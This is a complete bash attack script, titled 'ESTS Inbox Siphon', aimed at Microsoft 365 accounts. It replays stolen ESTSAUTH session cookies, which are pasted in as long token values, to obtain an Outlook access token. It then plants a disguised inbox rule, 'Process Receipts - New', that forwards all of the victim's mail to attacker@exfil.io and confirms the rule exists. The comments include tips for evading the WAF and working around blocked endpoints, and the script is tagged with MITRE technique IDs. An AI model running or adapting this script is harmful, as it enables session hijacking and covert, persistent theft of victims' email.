
# ESTS Inbox Siphon.
# !/usr/bin/env bash
# ============================================================
# cookie-login-inbox-rule.sh
# ESTS Cookie → Auth Code → Inbox Forwarding Rule (T1114.003)
#
# Flow:
#   ESTSAUTH + ESTSAUTHPERSISTENT cookies
#   → SSO authorize (d3590ed6, outlook.office.com scope)
#   → auth code → access token
#   → Outlook REST API v2.0 CreateInboxRule
#
# Notes:
#   - Cookie jar expiry must be > 0 (epoch 0 = curl drops the cookie)
#   - Sec-Fetch-* headers required (Microsoft WAF returns 417 without)
#   - sso_reload=True triggers ESTS SSO path, skips login form
#   - response_type=code only — implicit flow disabled on d3590ed6
#   - scope=outlook.office.com/.default gives Mail.ReadWrite implicitly;
#     graph.microsoft.com/.default on d3590ed6 does NOT
#   - EWS blocked on modern tenants (restrict-access-confirm: 1);
#     Outlook REST API v2.0 uses same audience, still works
#
# MITRE: T1114.003 — Email Forwarding Rule
#        T1550.004 — Cookie Replay
# ============================================================

# ── Config — paste values directly here ─────────────────────
ESTSAUTH="1.AUsAQi_y21HpB02FeRQApvmkc9fqWYwD1ydKnlXJagBUyNIAAONLAA.BQABFwQAAAADAOz_BQD0_0V2b1N0c0FydGlmYWN0cw8AAAAAAEMERIEuJHU2M5LGIIWkytSpslbD0mgF25M4QKuUhkuizus0mFJb88p29qZDIwmR4CrMJQjpfnA0chQJ9XBKLFZ3omBLqQS4c0RimOeBg_Qob0MasDG1FAJh-epHqQ7NEEhaFby2WfxAVxYKVV5t4EKXAurmgtbs6D0ig-RdRGhHBh4kHZ0H_KEL0Kt62IizcAqCbnPekuYQbcFBtDxxHyuWTVkvsD_aaP8VLo2In_4e3FKcrfUhdjAVNZH3Q3YupBL4GApz9FweXToFmA547YjTj_2_jjYMiMt7HSWt870kaRHJbvsrNDAdAdC0tbmdQHvHt7ku93nrH4S8Ztlo5piUCiRs9LWDJ617PQeOOcXbubr2fg2uDCf6sDOLpWtyq4Zm_kDixVnomaMNb1HxT8LVSpQVM1ut2xKiuqzeY95JjCKEXToxVSC8LhwT45a9U-OlzhXCxX2qO1oGJJQ0toIQP4VsYhco19OxLuzqyC_QNSeTWXXawPJJWH2Pq3Z424qPG79m8CPqPNrb94e5NBPawk_C00LUI1mRdHP-_Uv-eDnXwQS3LxPZLPGfR_5VFzL16bz-CtYlL-RYDVSwAd-Nqa8b_vfLl5iYuQBDAMRacxlo1dWi8IuDpPj7DhVoI6cpkFh90zuwR2HTWSTZy2NTlXRgmhKgYpXfnd_bARTTX-DHVYufA-w82hW3jNYBu4o7u2ngvitpwcfc-QJzo5xlhvxt5IXeD0FvEXZuWPQJV1wa-Jy_16zojHwlkA5q0xhvOOxSRF3H4gkPnzoz40pCYFcLl1GsD0jIXoMhB8tKFY-SMWp2_lMS1dkRy9AXqizllyktLUh7jS0MDfEwzBNp3N6HOMFkqjfvUk7q-wVemDzFSA-9mWSmc1GWk5m2cdaiTRA6NXk_64ptzdm4zrxiYoEpEqe-TnqpI-1XO8PCiYijTXbBck7AFQ0HQdpofAu2ZcXIPRjdDdPQBx1talsvzmUmkvGh8qq0yYuWSbC34HeoRrhUXWBbYmWZvVsvP-aGIxDX8mSw3MrQD27rtkZrbRnC34tznv0f3cjVlwKy3KskK8xG329XNmBfDwQMOWQ3L_riyQQn8MjRod6pr94_IWFdJ_DDUwszAHMnTB4J2UfnSSmi0e3KYexGdSpRrVvwvAj_JQPRGabu0ywFmXlR09m2lX15XQB3KB3qbwhx6lGT204W"
ESTSAUTHPERSISTENT="1.AUsAQi_y21HpB02FeRQApvmkc9fqWYwD1ydKnlXJagBUyNIAAONLAA.BQABFwQAAAADAOz_BQD0_0V2b1N0c0FydGlmYWN0cxAAAAAAAB2QceF75IgMuTpB83aRoqKIbLMXKzd3htGqSvJbxxZpeQmFr_teS68b0yHtTt24KlCIqsEbEge48RtBNQz0bPuLguH-MF4GV29S8JUipOaHFVeIHHV0v2JyBSnsrcDUi9jSR97QyDWiuOVv9phH7WqIHfy41c9M86Ft5uJBoZ9WDUN5ZOAsna4L4FSngTXqylIiU5qHOtiukc-iy6sXZ5_Cd6YsCdAC5zh6vohXIm5BAJjcO1I1jhxLLtSkP0ZMnIDiFWQknlSmbYMwGo_-q5rCaiQdGXvyxdS8vRMKa9agj1m9dpsA2YfS0ZkcX6-JW5_Z5K5gPPcWSwZyjFFTU-IVN-5VaDfYiJr5eR82r46c813l8WvtQj6h1ea_mHFZmMPybb74Te5XM5aYNJn4QHNA5n6pS0653iX_uVGK50ehJPGknZQb-mb5LwyIfKRlzW4qWEb3UUS_rw-w53sBYsfILNpnr3SuTLCnQYDLQP-MOhWMX7c8F9YbG6Q5YKFHf_rp9bL4_dbt9f2SQH4moiz3YUFdzOBIbEiSQ5Son-3qv6xOmS-7kDeFgN5_wcdQNPwCXXCgiFbQ-6xrP5diLPLalubKfNEPpbWhjscQAqTRtfokIneg9YIeuK0nPi39zhIQkJUJv44XUqoAnMahoaK7a33mASW062rrj8_69fzQZyJ5qWccwKu-uGh4MQm1HRlHivx1ncHgWBMfmCto-ycALZXPPQ8wi0NOLJ4rLY_G3XmDfv6wnzunDB78CPlgjdKLFZyHJU6HKSigxYiYt_Bb_4ptoGf_I1tSZXsA42DmFBMXPvT3YqOCC3XjAmNhLIffkdycFtBL95GzyZH9_G4wbIEgGQlNJJQPzU6y4uD2HsU5If9bGUSL6JdEIcPrnwyeEY-NJ6rMqsB8lgkbJ8vND97J-ZCuAosGRuqiDVwVfsOOR7Q"

FORWARD_TO="attacker@exfil.io"
RULE_NAME="Process Receipts - New"

CLIENT_ID="d3590ed6-52b3-4102-aeff-aad2292ab01c"
REDIRECT="https://login.microsoftonline.com/common/oauth2/nativeclient"
SCOPE_ENC="https%3A%2F%2Foutlook.office.com%2F.default+offline_access"
SCOPE_RAW="https://outlook.office.com/.default offline_access"

UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0.0.0"
WORKDIR=$(mktemp -d)
COOKIEJAR="$WORKDIR/ests.txt"


# ── Step 1: Write cookie jar ─────────────────────────────────
EXPIRE=$(python3 -c "import time; print(int(time.time()) + 31536000)")

cat > "$COOKIEJAR" << COOKIEEOF
# Netscape HTTP Cookie File
login.microsoftonline.com	FALSE	/	TRUE	${EXPIRE}	ESTSAUTH	${ESTSAUTH}
login.microsoftonline.com	FALSE	/	TRUE	${EXPIRE}	ESTSAUTHPERSISTENT	${ESTSAUTHPERSISTENT}
COOKIEEOF

echo "[*] Cookie jar written  (expiry epoch: $EXPIRE)"

# ── Step 2: SSO → auth code ──────────────────────────────────
AUTH_URL="https://login.microsoftonline.com/common/oauth2/v2.0/authorize"
AUTH_URL+="?client_id=${CLIENT_ID}"
AUTH_URL+="&response_type=code"
AUTH_URL+="&redirect_uri=$(python3 -c "import urllib.parse; print(urllib.parse.quote('${REDIRECT}'))")"
AUTH_URL+="&scope=${SCOPE_ENC}"
AUTH_URL+="&response_mode=query"
AUTH_URL+="&sso_reload=True"

CODE=$(curl -s -i --max-redirs 0 \
  -b "$COOKIEJAR" \
  -H "User-Agent: $UA" \
  -H "Accept: text/html,application/xhtml+xml" \
  -H "Sec-Fetch-Dest: document" \
  -H "Sec-Fetch-Mode: navigate" \
  -H "Sec-Fetch-Site: none" \
  -H "Sec-Fetch-User: ?1" \
  -H "Expect:" \
  "$AUTH_URL" 2>/dev/null \
  | grep -i "^location:" \
  | python3 -c "
import sys, re
m = re.search(r'[?&]code=([^&\s]+)', sys.stdin.read())
print(m.group(1) if m else '')
")

if [[ -z "$CODE" ]]; then
  echo "[!] No auth code — session expired or cookies invalid"
  rm -rf "$WORKDIR"
  return 2>/dev/null || true
fi
echo "[+] Auth code: ${CODE:0:50}..."

# ── Step 3: Exchange code → access token ────────────────────
TOKEN_RESP=$(curl -s -X POST \
  "https://login.microsoftonline.com/common/oauth2/v2.0/token" \
  -H "User-Agent: $UA" \
  -d "grant_type=authorization_code" \
  -d "client_id=${CLIENT_ID}" \
  -d "code=${CODE}" \
  -d "redirect_uri=${REDIRECT}" \
  -d "scope=${SCOPE_RAW}")

ACCESS_TOKEN=$(echo "$TOKEN_RESP" | python3 -c "
import sys, json
d = json.load(sys.stdin)
if 'error' in d:
    print(f'[!] Token error: {d.get(\"error_description\",\"\")[:200]}')
print(d.get('access_token', ''))
")

echo "$TOKEN_RESP" | python3 -c "
import sys, json, base64
d = json.load(sys.stdin)
t = d.get('access_token', '')
p = t.split('.')[1]
p += '=' * (4 - len(p) % 4)
c = json.loads(base64.urlsafe_b64decode(p))
print(f'[+] Signed in as : {c.get(\"upn\",\"\")}')
print(f'[+] Token aud    : {c.get(\"aud\",\"\")}')
print(f'[+] Mail.ReadWrite in scp: {\"Mail.ReadWrite\" in c.get(\"scp\",\"\")}')
"

# ── Step 4: Create forwarding rule ───────────────────────────
echo ""
echo "[*] Creating rule: '$RULE_NAME' → $FORWARD_TO"

RULE_RESP=$(curl -s -i -X POST \
  "https://outlook.office.com/api/v2.0/me/mailfolders/inbox/messagerules" \
  -H "Authorization: Bearer ${ACCESS_TOKEN}" \
  -H "Content-Type: application/json" \
  -H "User-Agent: $UA" \
  -d "{
    \"DisplayName\": \"${RULE_NAME}\",
    \"Sequence\": 1,
    \"IsEnabled\": true,
    \"Conditions\": {},
    \"Actions\": {
      \"ForwardTo\": [{\"EmailAddress\": {\"Address\": \"${FORWARD_TO}\"}}],
      \"StopProcessingRules\": false
    }
  }")

HTTP_STATUS=$(echo "$RULE_RESP" | grep "^HTTP" | awk '{print $2}')

if [[ "$HTTP_STATUS" == "201" ]]; then
  echo "$RULE_RESP" | tail -1 | python3 -c "
import sys, json
d = json.load(sys.stdin)
fwd = [f['EmailAddress']['Address'] for f in d.get('Actions',{}).get('ForwardTo',[])]
print(f'[+] Rule ID    : {d.get(\"Id\")}')
print(f'[+] Name       : {d.get(\"DisplayName\")}')
print(f'[+] Enabled    : {d.get(\"IsEnabled\")}')
print(f'[+] ForwardTo  : {fwd}')
print(f'[+] Sequence   : {d.get(\"Sequence\")}')
"
else
  echo "[!] HTTP $HTTP_STATUS — create failed:"
  echo "$RULE_RESP" | tail -1
fi

# ── Step 5: Verify — list all rules ─────────────────────────
echo ""
echo "[*] Verifying all inbox rules..."
curl -s "https://outlook.office.com/api/v2.0/me/mailfolders/inbox/messagerules" \
  -H "Authorization: Bearer ${ACCESS_TOKEN}" \
  -H "User-Agent: $UA" \
  | python3 -c "
import sys, json
rules = json.load(sys.stdin).get('value', [])
print(f'[+] Total rules: {len(rules)}')
for r in rules:
    fwd   = [f['EmailAddress']['Address'] for f in r.get('Actions',{}).get('ForwardTo',[])]
    redir = [f['EmailAddress']['Address'] for f in r.get('Actions',{}).get('RedirectTo',[])]
    print(f'    [{r[\"Id\"]}] \"{r[\"DisplayName\"]}\"  enabled={r[\"IsEnabled\"]}  fwd={fwd}  redir={redir}')
"

rm -rf "$WORKDIR"
echo ""
echo "[+] Done.  MITRE T1114.003 — inbox forwarding rule planted."
